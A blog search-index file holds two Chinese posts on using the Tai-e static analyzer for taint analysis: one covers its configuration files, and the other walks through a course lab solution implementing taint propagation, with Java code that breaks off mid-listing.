<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Tai-e的使用</title>
    <link href="/posts/2e148601.html"/>
    <url>/posts/2e148601.html</url>
    
    <content type="html"><![CDATA[<h1 id="污点分析"><a class="markdownIt-Anchor" href="#污点分析"></a> 污点分析</h1><h2 id="启动"><a class="markdownIt-Anchor" href="#启动"></a> 启动</h2><ul><li>在tai-e的启动类 <code>src/main/java/pascal/taie/Main.java</code> 配置参数 <code>--options-file config\xxx\options.yml</code> 即可开始分析，这里需要对于 options.yml 文件进行修改来达到相应目的</li></ul><h2 id="配置options"><a class="markdownIt-Anchor" href="#配置options"></a> 配置options</h2><h3 id="java-se"><a class="markdownIt-Anchor" href="#java-se"></a> java se</h3><ul><li>需要先在文件当前目录下使用 <code>javac *.java</code> 生成class文件，然后soot的前端才可以识别转化为IR。</li><li>对于 <code>optios.yml</code> 文件的配置，首先使用测试类 <code>pascal/taie/analysis/pta/TaintTest.java</code> 对于本地存储的样例进行测试，最后会在 output 目录下生成一个 options.yml 文件，然后直接抄这个文件的配置即可，若是对于这一个文件还不知道抄哪些，可以在 <code>Main.main</code> 方法下面下断点，主要是得到此时的main方法参数 args，然后修改 -m 类名，然后粘贴到 IDEA 中配置 main 的参数处，运行相应的实验类即可，多个比较可以找到共同之处，然后抄写即可。</li><li>这里注意 <code>javaVersion</code> 对于有些案例有要求，可用17，8，6都试一试。</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">classPath::</span><span class="hljs-comment"># 这个为class文件存储的目录</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">src/main/java/example</span><br><span class="hljs-attr">appClassPath:</span> []<br><span class="hljs-comment"># 这个为分析java web应用时使用，二者区别为前者只会添加个别类(application/main/input)的引用类到分析程序中，后者会将所有的的引用类加入到分析程序中</span><br><span class="hljs-attr">mainClass:</span> <span class="hljs-string">test</span><span class="hljs-comment"># 分析的主程序，需要写完整的包名，没有包名就只写类名，我感觉区别在于代码在main中需要包名，在test中只用类名</span><br><span class="hljs-comment"># 这里对于 taint-config 的书写也是根据路径需要写完整的包名</span><br><span class="hljs-attr">analyses:</span><br>  <span class="hljs-attr">pta:</span> <span class="hljs-string">&quot;implicit-entries:false;only-app:true;distinguish-string-constants:all;taint-config:src/test/resources/pta/taint/taint-config.yml&quot;</span><br>  <br>  <br><span class="hljs-comment"># 目录分析</span><br><span class="hljs-string">├─main</span><br><span class="hljs-string">│</span>  <span class="hljs-string">├─java</span><br><span class="hljs-string">│</span>  <span class="hljs-string">│</span>  <span class="hljs-string">├─com</span><br><span class="hljs-string">│</span>  <span class="hljs-string">│</span>  <span class="hljs-string">│</span>  <span class="hljs-string">└─example</span><br><span class="hljs-comment"># 对于这样的结构，example中还有Demo1.java和sourceSink.java，classPath需要写成 src/main/java</span><br><span class="hljs-comment"># 而 mainClass 则是需要写成完整的包名</span><br></code></pre></td></tr></table></figure><ul><li>这里补充一下抄录的使用测试类给与的参数分析的 options.yml 内容，查看 analyses:pta 的内容，可以看到与预期文件进行比较和使用指针分析的插件类，这种插件类对于分析 javase 不用设置，但是分析 java web时需要进行添加，因为它没有统一的入口 main 方法，所以需要根据特性添加 entrypoint 和 Source。</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">optionsFile:</span> <span class="hljs-literal">null</span><br><span class="hljs-attr">printHelp:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">classPath:</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">src/test/resources/pta/taint</span><br><span class="hljs-attr">appClassPath:</span> []<br><span class="hljs-attr">mainClass:</span> <span class="hljs-string">ArrayTaint</span><br><span class="hljs-attr">inputClasses:</span> []<br><span class="hljs-attr">javaVersion:</span> <span class="hljs-number">6</span><br><span class="hljs-attr">prependJVM:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">allowPhantom:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">worldBuilderClass:</span> <span class="hljs-string">pascal.taie.frontend.soot.SootWorldBuilder</span><br><span class="hljs-attr">outputDir:</span> <span class="hljs-string">output/Builtin</span><br><span class="hljs-attr">preBuildIR:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">worldCacheMode:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">scope:</span> <span class="hljs-string">APP</span><br><span class="hljs-attr">nativeModel:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">planFile:</span> <span class="hljs-literal">null</span><br><span class="hljs-attr">analyses:</span><br>  <span class="hljs-attr">pta:</span> <span class="hljs-string">&quot;implicit-entries:false;only-app:true;distinguish-string-constants:all;expected-file:src/test/resources/pta/taint/ArrayTaint-pta-expected.txt;taint-config:src/test/resources/pta/taint/taint-config.yml;plugins:[pascal.taie.analysis.pta.plugin.assertion.AssertionChecker]&quot;</span><br><span class="hljs-attr">onlyGenPlan:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">keepResult:</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">$KEEP-ALL</span><br></code></pre></td></tr></table></figure><ul><li>下面的则是在 IDEA 中配置 main 方法使用的参数，它得到的结果就是上面的 options.yml 文件，二者是等价的</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">-pp<br>-cp<br>src/test/resources/pta/taint<br>-m<br>ArrayTaint<br>-a<br>pta=implicit-entries:false;only-app:true;distinguish-string-constants:all;expected-file:src/test/resources/pta/taint/ArrayTaint-pta-expected.txt;taint-config:src/test/resources/pta/taint/taint-config.yml;plugins:[pascal.taie.analysis.pta.plugin.assertion.AssertionChecker]<br></code></pre></td></tr></table></figure><h3 id="java-web"><a class="markdownIt-Anchor" href="#java-web"></a> java web</h3><ul><li>若是采用命令行执行分析，则需要在 <code>Tai-e</code> 根目录下执行命令，这是因为需要用到java-benchmarks，它在根目录，且路径前缀写死，只有在根目录进行索引才不会出现问题。同时 IDEA 里面的参数设置也都是根据根目录来的。除此之外，这里首先需要在 Gradle 里面，点击 <code>Tasks/build/fatJar</code> 将加入了新的插件的 Tai-e 重新打包，然后执行下列语句即可。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -cp ./build/tai-e-all-0.5.1-SNAPSHOT.jar pascal.taie.Main --options-file=config/xxx/options.yml<br></code></pre></td></tr></table></figure><h2 id="配置taint-config"><a class="markdownIt-Anchor" href="#配置taint-config"></a> 配置taint-config</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 在 options 中 配置了下面内容，则taint配置的类需要加包名</span><br><span class="hljs-attr">classPath:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">src/main/java</span><br><span class="hljs-attr">appClassPath:</span> []<br><span class="hljs-attr">mainClass:</span> <span class="hljs-string">com.example.Demo1</span><br><br><span class="hljs-comment"># 如下为taint的配置</span><br><span class="hljs-attr">sources:</span><br>  <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">kind:</span> <span class="hljs-string">call</span>, <span class="hljs-attr">method:</span> <span class="hljs-string">&quot;&lt;com.example.SourceSink: java.lang.String source()&gt;&quot;</span>, <span class="hljs-attr">index:</span> <span class="hljs-string">result</span> &#125;<br>  <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">kind:</span> <span class="hljs-string">call</span>, <span class="hljs-attr">method:</span> <span class="hljs-string">&quot;&lt;com.example.SourceSink: java.lang.String sourceAndSink(java.lang.String,java.lang.String)&gt;&quot;</span>, <span class="hljs-attr">index:</span> <span class="hljs-string">result</span> &#125;<br>  <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">kind:</span> <span class="hljs-string">field</span>, <span class="hljs-attr">field:</span> <span class="hljs-string">&quot;&lt;com.example.SourceSink: java.lang.String tainted1&gt;&quot;</span> &#125;<br>  <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">kind:</span> <span class="hljs-string">field</span>, <span class="hljs-attr">field:</span> <span class="hljs-string">&quot;&lt;com.example.SourceSink: java.lang.String tainted2&gt;&quot;</span> &#125;<br><br><span class="hljs-attr">sinks:</span><br>  <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">method:</span> <span class="hljs-string">&quot;&lt;com.example.SourceSink: void sink(java.lang.String)&gt;&quot;</span>, <span class="hljs-attr">index:</span> <span class="hljs-number">0</span> &#125;<br>  <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">method:</span> <span class="hljs-string">&quot;&lt;com.example.SourceSink: void sink(java.lang.String,int)&gt;&quot;</span>, <span class="hljs-attr">index:</span> <span class="hljs-number">0</span> &#125;<br>  <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">method:</span> <span class="hljs-string">&quot;&lt;com.example.SourceSink: void sink(java.lang.String,java.lang.String)&gt;&quot;</span>, <span class="hljs-attr">index:</span> <span class="hljs-number">1</span> &#125;<br>  <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">method:</span> <span class="hljs-string">&quot;&lt;com.example.SourceSink: java.lang.String sourceAndSink(java.lang.String,java.lang.String)&gt;&quot;</span>, <span class="hljs-attr">index:</span> <span class="hljs-number">0</span> &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>静态分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《软件分析》Lab8</title>
    <link href="/posts/7b62d63d.html"/>
    <url>/posts/7b62d63d.html</url>
    
    <content type="html"><![CDATA[<h1 id="相关配置"><a class="markdownIt-Anchor" href="#相关配置"></a> 相关配置</h1><h2 id="java配置"><a class="markdownIt-Anchor" href="#java配置"></a> java配置</h2><ol><li>设置 <code>Settings -&gt; Project Structure -&gt; SDK: java17 -- Language level: 17 - Sealed types, always-strict floating-point semantics</code></li><li>设置 <code>Settings -&gt; Build,Execution,Deployment -&gt; Gradle -&gt; Build and run using: interlliJ IDEA(下面那个也一样)</code></li></ol><h2 id="dot-png"><a class="markdownIt-Anchor" href="#dot-png"></a> dot-&gt;png</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos">dot -Tpng <span class="hljs-built_in">tree</span>.dot -o <span class="hljs-built_in">tree</span>.png<br># 其中<span class="hljs-built_in">tree</span>.dot为dot形式名称，<span class="hljs-built_in">tree</span>.png为图片png形式名称，除此之外可以使用-Tsvg进行转化<br></code></pre></td></tr></table></figure><h1 id="lab8"><a class="markdownIt-Anchor" href="#lab8"></a> Lab8</h1><h2 id="理解"><a class="markdownIt-Anchor" href="#理解"></a> 理解</h2><h2 id="题目相关"><a class="markdownIt-Anchor" href="#题目相关"></a> 题目相关</h2><ul><li>为 Java 实现污点分析</li></ul><h2 id="污点分析"><a class="markdownIt-Anchor" href="#污点分析"></a> 污点分析</h2><h3 id="plugin"><a class="markdownIt-Anchor" href="#plugin"></a> plugin</h3><ul><li><p><code>pascal.taie.analysis.pta.plugin.taint.TaintTransfer</code></p><ul><li>这个 record 类表示污点传播。在这个类中，我们用整数来表示污点传播被对应方法引发时的 from 变量和 to 变量。具体来说，一个大于等于 0 的整数 i 表示调用点上被调用方法的第 i 个参数；-1 表示 base 变量；-2 表示接收结果的变量。这里就是对于 <code>taintTransfer.from()</code> 和 <code>taintTransfer.to()</code> 两个 Int 类型，他们使用整数来表示一个方法调用的各个部分。</li></ul></li><li><p><code>pascal.taie.analysis.pta.plugin.taint.TaintConfig</code></p><ul><li>这个类表示污点分析的配置信息。它提供了解析配置文件以及获取 sources、sinks 和污点传播信息的 API。它读取<code>taint-config.yml</code> 配置的source，sink，transfers信息，然后利用 api 传递出去。</li></ul></li><li><p><code>pascal.taie.analysis.pta.plugin.taint.TaintManager</code></p><ul><li>这个类被用来管理污点分析中的污点对象，通过 <code>makeTaint</code> 方法构建污点对象 obj，之后使用指针分析的 <code>getCSObj</code> 给一个空上下文，构建 csObj。</li></ul></li><li><p><code>pascal.taie.analysis.pta.plugin.taint.TaintFlow</code></p><ul><li>这个 record 类表示分析算法检测到的 taint flows（由 source 的调用点和 sink 的调用点组成），也就是污点分析算法的结果。它不需要参与 PTA 的过程，因此可以根据最后的 pts 来处理污点流，所以这里通过对于所有的 Sink csCallSite 进行遍历，构建最后的 &lt;j,l,i&gt; -&gt; taintFlows</li></ul></li></ul><h3 id="具体代码"><a class="markdownIt-Anchor" href="#具体代码"></a> 具体代码</h3><h4 id="代码总览"><a class="markdownIt-Anchor" href="#代码总览"></a> 代码总览</h4><p>​需要补全的 <code>pascal.taie.analysis.pta.cs.Solver</code> 的五个方法</p><ul><li><code>void addReachable(CSMethod)</code></li><li><code>void addPFGEdge(Pointer,Pointer)</code></li><li><code>void analyze()</code></li><li><code>PointsToSet propagate(Pointer,PointsToSet)</code></li><li><code>void processCall(CSVar,CSObj)</code></li></ul><p>​同时补全<code>pascal.taie.analysis.pta.plugin.taint.TaintAnalysiss</code> 中的一个方法，添加适当的API进行构造</p><ul><li><code>Set&lt;TaintFlow&gt; collectTaintFlows()</code></li></ul><h4 id="analyze"><a class="markdownIt-Anchor" href="#analyze"></a> analyze</h4><p>​这里就是在 <code>PointsToSet delta = propagate(n, pts);</code> 下面添加语句，<code>taintAnalysis.propagate(n, delta);</code>，这个语句就是处理 delta 中的污点对象，在 taintAnalysis 中实现一个 <code>propagate</code> 方法，获取 delta 中的污点对象，然后将其后继节点加入 WorkList 进行处理，从而将这个污点进行传播</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 仿照 PFG 的 propagate 将 taint object 向后继节点进行传播</span><br>   <span class="hljs-comment">// 这里就是判断当 delta 中包含污点对象时，应该基于 &quot;污点传播边&quot; 向后继节点传播污点对象</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">propagate</span><span class="hljs-params">(Pointer pointer, PointsToSet delta)</span> &#123;<br>       <span class="hljs-type">PointsToSet</span> <span class="hljs-variable">taint</span> <span class="hljs-operator">=</span> PointsToSetFactory.make();<br>       <span class="hljs-comment">// 获取 delta 中的 taint object</span><br>       delta.forEach(csObj -&gt; &#123;<br>           <span class="hljs-keyword">if</span> (manager.isTaint(csObj.getObject())) &#123;<br>               taint.addObject(csObj);<br>           &#125;<br>       &#125;);<br>       <span class="hljs-keyword">if</span> (taint.isEmpty()) <span class="hljs-keyword">return</span>;<br>       <span class="hljs-comment">// 基于这些 &quot;污点传播边&quot; 向后继节点传播 taint object，即在 WorkList 中添加 &lt;t, pt(s)&gt;</span><br>       taintFlowGraph.getSuccsOf(pointer).forEach(suc -&gt; &#123;<br>           solver.addWorkList(suc, taint);<br>       &#125;);<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="processcall"><a class="markdownIt-Anchor" href="#processcall"></a> processCall</h4><p>​这里修改了 A6 中的静态调用和动态调用的共存部分，通过将中间部分进行扩展获得更多的信息，从而提供给污点传播进行利用，但是其效果和之前实现的并没有区别，这里主要在处理的中间方法 <code>processEachCall</code> 添加对于污点的 Source，Sink，TaintTransfer 的处理，这里就是因为它们只会发生在 Invoke 中，所以直接在这个必经之处进行添加处理即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (callGraph.addEdge(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Edge</span>&lt;&gt;(CallGraphs.getCallKind(callSite), csCallSite, ctMethod)))&#123;<br><span class="hljs-comment">// Taint 1. 若是该调用为 Source，则首先产生一个 taint object</span><br>       <span class="hljs-comment">// 之后增加 point(c: r) -&gt; pointsToSet(t)，同时添加到 workList 中</span><br>       <span class="hljs-type">PointsToSet</span> <span class="hljs-variable">pts</span> <span class="hljs-operator">=</span> taintAnalysis.dealSource(callSite, jMethod);<br>       <span class="hljs-keyword">if</span> (pts != <span class="hljs-literal">null</span>) &#123;<br>           workList.addEntry(csManager.getCSVar(context, callSite.getLValue()), pts);<br>       &#125;<br>       <span class="hljs-comment">// Taint 2. 若是调用为 sink，则添加 sink 点，从而获得所有的 CSCallSite</span><br>       taintAnalysis.dealSinkCallSite(csCallSite, jMethod);<br>       <span class="hljs-comment">// Taint 3. 对于污点的传播进行处理，根据三种不同的规则将 taint 从一些变量传播到另外一些变量中</span><br>       taintAnalysis.dealTaintTransfer(csCallSite, jMethod, recv);<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里在没有创建 edge 的条件下进行污点传播的分析，通过添加不同的语句分别对于上面三者进行处理。通过在taintAnalysis 中实现 <code>dealSource</code>，<code>dealSinkCallSite</code>，<code>dealTaintTransfer</code> 三种方法进行处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 处理 Source，在 Invoke 中判断是否为 Source，是则添加 taint object</span><br>   <span class="hljs-keyword">public</span> PointsToSet <span class="hljs-title function_">dealSource</span><span class="hljs-params">(Invoke callSite, JMethod jMethod)</span> &#123;<br>       <span class="hljs-keyword">for</span> (Source source : config.getSources()) &#123;<br>           <span class="hljs-comment">// 比对调用方法和存储的 Source 是否有一样的，一样则产生 taint object，此时的 callSite 就是 Source</span><br>           <span class="hljs-keyword">if</span> (source.method().getSignature().equals(jMethod.getSignature())) &#123;<br>               <span class="hljs-comment">// 创建 taint object，使用空上下文作为污点对象t(source, type)的堆上下文</span><br>               <span class="hljs-keyword">return</span> PointsToSetFactory.make(<br>                       csManager.getCSObj(emptyContext, manager.makeTaint(callSite, jMethod.getReturnType())));<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​对于 Source，就是查看方法调用的 method 是否为给定的 Source 中的一个，若是，则添加一个指针的执行，使调用方法的左值(返回值)指向一个污点对象集</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 处理 Sink，在遇见 sink 点时添加 sink 到 sinkCallSites</span><br><span class="hljs-comment">// 从而可以保存所有的 Sink csCallSite，然后在 collectTaintFlows 中进行处理形成 taintFlows</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dealSinkCallSite</span><span class="hljs-params">(CSCallSite callSite, JMethod jMethod)</span> &#123;<br>    config.getSinks().forEach(sink -&gt; &#123;<br>        <span class="hljs-keyword">if</span> (sink.method().getSignature().equals(jMethod.getSignature())) &#123;<br>            sinkCallSites.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SinkCallSite</span>(callSite, sink));<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>​对于 Sink，则是判定 method 是否为配置中的 Sink，若是，则添加到 sinkCallSites 中，保存了污点分析所有的 sink 调用语句，以便后续在 collectTaintFlows 中形成 TaintFlows。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 处理 TaintTransfer，依据污点的传播规则对于污点进行传播处理</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dealTaintTransfer</span><span class="hljs-params">(CSCallSite csCallSite, JMethod jMethod, CSVar csVar)</span> &#123;<br>       <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> csCallSite.getContext();<br>       config.getTransfers().forEach(taintTransfer -&gt; &#123;<br>           <span class="hljs-keyword">if</span> (taintTransfer.method().getSignature().equals(jMethod.getSignature())) &#123;<br>               <span class="hljs-comment">// 这里 taintTransfer.from() 指的是相应 taint object 参数的下标，使用 index 替代</span><br>               <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> taintTransfer.from();<br>               <span class="hljs-keyword">if</span> (index == TaintTransfer.BASE &amp;&amp; taintTransfer.to() == TaintTransfer.RESULT) &#123;<br>                   <span class="hljs-comment">// base-to-result，这里 csVar 是 recv，也就是 base变量</span><br>                   <span class="hljs-type">Var</span> <span class="hljs-variable">lVar</span> <span class="hljs-operator">=</span> csCallSite.getCallSite().getLValue();<br>                   addTFGEdge(csVar, csManager.getCSVar(context, lVar), jMethod.getReturnType());<br>               &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">0</span> &amp;&amp; taintTransfer.to() == TaintTransfer.BASE) &#123;<br>                   <span class="hljs-comment">// Arg-to-base，根据 index 找到 args 中对应的 taint object</span><br>                   List&lt;Var&gt; args = csCallSite.getCallSite().getInvokeExp().getArgs();<br>                   <span class="hljs-type">CSVar</span> <span class="hljs-variable">arg</span> <span class="hljs-operator">=</span> csManager.getCSVar(context, args.get(index));<br>                   addTFGEdge(arg, csVar, jMethod.getReturnType());<br>               &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">0</span> &amp;&amp; taintTransfer.to() == TaintTransfer.RESULT) &#123;<br>                   <span class="hljs-comment">// Arg-to-result</span><br>                   List&lt;Var&gt; args = csCallSite.getCallSite().getInvokeExp().getArgs();<br>                   <span class="hljs-type">CSVar</span> <span class="hljs-variable">arg</span> <span class="hljs-operator">=</span> csManager.getCSVar(context, args.get(index));<br>                   <span class="hljs-type">Var</span> <span class="hljs-variable">lVar</span> <span class="hljs-operator">=</span> csCallSite.getCallSite().getLValue();<br>                   addTFGEdge(arg, csManager.getCSVar(context, lVar), jMethod.getReturnType());<br>               &#125;<br>           &#125;<br>       &#125;);<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里是 TaintTransfer 的处理，对于三种传播规则，base-to-result，Arg-to-base，Arg-to-result进行处理，然后通过构建 addTFGEdge 添加污点边，从而给上文的 delta 的传播提供传播的污点传播流，进行污点信息的传递。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 在 TFG 中添加边 &quot;source -&gt; target&quot;，同时调用 workList.addEntry，添加 target 指向 pts(source)</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTFGEdge</span><span class="hljs-params">(Pointer source, Pointer target, Type type)</span> &#123;<br>    <span class="hljs-comment">// 检查污点传播的边是否存在。同时若是静态调用，则 source 和 target 其中一个为 null，直接进行下面的 if 判断返回</span><br>    <span class="hljs-comment">// 符合静态方法没有 base 变量，所以他们不会引起 base-to-result 和 arg-to-base 的污点传播的情况</span><br>    <span class="hljs-comment">// 这里 addEdge 返回 boolean，存在边返回 true， 这里不存在就进行 添加边的处理，顺便区分了静态调用和动态调用</span><br>    <span class="hljs-keyword">if</span> (!taintFlowGraph.addEdge(source, target)) <span class="hljs-keyword">return</span>;<br>    source.getPointsToSet().forEach(csObj -&gt; &#123;<br>        <span class="hljs-type">Obj</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> csObj.getObject();<br>        <span class="hljs-keyword">if</span> (manager.isTaint(obj)) &#123;<br>            solver.addWorkList(target, PointsToSetFactory.make(<br>                    csManager.getCSObj(emptyContext, manager.makeTaint(manager.getSourceCall(obj), type))));<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="collecttaintflows"><a class="markdownIt-Anchor" href="#collecttaintflows"></a> collectTaintFlows</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Set&lt;TaintFlow&gt; <span class="hljs-title function_">collectTaintFlows</span><span class="hljs-params">()</span> &#123;<br>       Set&lt;TaintFlow&gt; taintFlows = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>&lt;&gt;();<br>       <span class="hljs-type">PointerAnalysisResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> solver.getResult();<br>       <span class="hljs-comment">// TODO - finish me</span><br>       <span class="hljs-comment">// You could query pointer analysis results you need via variable result.</span><br>       <span class="hljs-comment">// 遍历保存的所有 Sink csCallSite 点，形成 &lt;j, l, i&gt; ⊏ TaintFlows</span><br>       sinkCallSites.forEach(sinkCallSite -&gt; &#123;<br>           <span class="hljs-type">CSCallSite</span> <span class="hljs-variable">csCallSite</span> <span class="hljs-operator">=</span> sinkCallSite.callSite;<br>           <span class="hljs-type">Sink</span> <span class="hljs-variable">sink</span> <span class="hljs-operator">=</span> sinkCallSite.sink;<br>           <span class="hljs-comment">// 获取调用点的参数的下标 index</span><br>           List&lt;Var&gt; args = csCallSite.getCallSite().getInvokeExp().getArgs();<br>           <span class="hljs-comment">// 遍历参数 a_i 的所有指针集，若是包含 taint object，则增加 &lt;j, l, i&gt; 到 TaintFlows 中</span><br>           result.getPointsToSet(csManager.getCSVar(<br>                   csCallSite.getContext(), args.get(sink.index()))).forEach(csObj -&gt; &#123;<br>               <span class="hljs-keyword">if</span> (manager.isTaint(csObj.getObject())) &#123;<br>                   taintFlows.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TaintFlow</span>(<br>                           manager.getSourceCall(csObj.getObject()), csCallSite.getCallSite(), sink.index()));<br>               &#125;<br>           &#125;);<br>       &#125;);<br>       <span class="hljs-keyword">return</span> taintFlows;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里就是对于最后的 TaintFlow 进行处理，通过遍历所有的 Sink csCallSite 来获得最后的 TaintFlow流</p><h4 id="辅助设置"><a class="markdownIt-Anchor" href="#辅助设置"></a> 辅助设置</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 